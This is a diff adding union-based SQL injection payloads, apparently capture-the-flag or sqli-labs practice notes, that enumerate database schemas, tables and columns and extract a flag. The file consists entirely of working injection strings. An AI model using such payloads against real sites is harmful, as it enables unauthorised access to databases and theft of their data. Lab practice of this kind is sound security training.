@@ -2,3 +2,19 @@
 0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='skctf'),3,4 #
 0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='fl4g'),3,4 #
 0' union select 1,(select skctf_flag from fl4g),3,4 #
+
+
+
+
+
+
+?id=1' order by 3 --+
+
+?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+
+?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='flag' --+
+
+?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='Less1' --+
+
+?id=-1' union select 1,2,group_concat(flag) from flag.Less1 --+
+
